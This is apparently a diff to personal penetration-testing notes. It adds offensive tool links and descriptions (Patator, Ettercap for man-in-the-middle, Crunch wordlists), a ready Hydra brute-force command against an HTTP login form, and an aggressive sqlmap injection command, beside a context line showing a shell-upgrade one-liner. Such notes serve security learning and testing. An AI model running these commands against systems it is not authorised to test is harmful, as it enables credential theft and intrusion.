@@ -14,6 +14,7 @@ http://docs.w3af.org/en/latest/install.html
 
 Bruteforcing tool Patator:
 https://tools.kali.org/password-attacks/patator
+https://github.com/lanjelot/patator (Docker based)
 
 XSS and all: PwnXSS & XSSer
 
@@ -29,6 +30,11 @@ https://github.com/savio-code/fern-wifi-cracker
 Locate Wifi info:
 https://wigle.net/search
 
+Nmap vs Netdiscover: NMAP is based on IP requests, Netdiscover is based on ARP, hence faster
+Wireshark: protocol analyser
+Snmpcheck/snmpwalk: Test snmp
+Ettercap: Perform MITM
+Crunch: create word list
 
 
 
@@ -192,7 +198,11 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 
 
 
+Hydra example
+hydra -s 80 -L /usr/share/metasploit-framework/data/wordlists/http_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt 169.254.137.71 http-post-form '/login:username=^USER^&password=^PASS^:F=Incorrect' -e ns -t 1 -w 5 -W 1 -vV
 
+Sqlmap examples
+sqlmap -r login -p username,password --risk 3 --level 5 --dbms mysql
 
 
 
